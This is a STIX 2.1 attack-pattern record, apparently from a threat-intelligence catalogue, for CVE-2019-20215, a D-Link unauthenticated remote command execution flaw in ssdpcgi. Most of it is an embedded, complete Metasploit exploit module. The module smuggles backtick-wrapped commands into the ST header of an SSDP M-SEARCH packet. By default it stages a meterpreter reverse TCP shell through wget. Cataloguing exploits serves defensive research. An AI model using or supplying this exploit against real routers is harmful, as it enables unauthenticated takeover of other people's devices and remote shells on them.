{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4db9400a-81ba-45ea-9a6c-3ea6e5eb7c81",
    "created": "2024-08-14T16:58:25.930258Z",
    "modified": "2024-08-14T16:58:25.930262Z",
    "name": "D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi",
    "description": " D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/upnp/dlink_dir859_exec_ssdpcgi.rb",
            "external_id": "dlink_dir859_exec_ssdpcgi.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-20215"
        },
        {
            "source_name": "reference",
            "url": "https://medium.com/@s1kr10s/2e799acb8a73"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Udp\n  include Msf::Exploit::CmdStager\n  include Msf::Module::Deprecated\n\n  deprecated(Date.new(2024, 12, 1), 'Use `exploit/linux/upnp/dlink_upnp_msearch_exec` instead')\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi',\n      'Description' => %q{\n        D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi.\n      },\n      'Author'      =>\n        [\n          's1kr10s',\n          'secenv'\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['CVE', '2019-20215'],\n          ['URL', 'https://medium.com/@s1kr10s/2e799acb8a73']\n        ],\n      'DisclosureDate' => '2019-12-24',\n      'Privileged'     => true,\n      'Platform'       => 'linux',\n      'Arch'        => ARCH_MIPSBE,\n      'DefaultOptions' =>\n        {\n            'PAYLOAD' => 'linux/mipsbe/meterpreter_reverse_tcp',\n            'CMDSTAGER::FLAVOR' => 'wget',\n            'RPORT' => '1900'\n        },\n      'Targets'        =>\n        [\n          [ 'Auto',\t{ } ],\n        ],\n      'CmdStagerFlavor' => %w{ echo wget },\n      'DefaultTarget'  => 0\n      ))\n\n  register_options(\n    [\n      Msf::OptEnum.new('VECTOR',[true, 'Header through which to exploit the vulnerability', 'URN', ['URN', 'UUID']])\n    ])\n  end\n\n  def exploit\n    execute_cmdstager(linemax: 1500)\n  end\n\n  def execute_command(cmd, opts)\n    type = datastore['VECTOR']\n    if type == \"URN\"\n      print_status(\"Target Payload URN\")\n      val = \"urn:device:1;`#{cmd}`\"\n    else\n      print_status(\"Target Payload UUID\")\n      val = \"uuid:`#{cmd}`\"\n    end\n\n    connect_udp\n    header = \"M-SEARCH * HTTP/1.1\\r\\n\"\n    header << \"Host:239.255.255.250: \" + datastore['RPORT'].to_s + \"\\r\\n\"\n    header << \"ST:#{val}\\r\\n\"\n    header << \"Man:\\\"ssdp:discover\\\"\\r\\n\"\n    header << \"MX:2\\r\\n\\r\\n\"\n    udp_sock.put(header)\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-12-24",
    "x_mitre_platforms": [
        "linux'"
    ]
}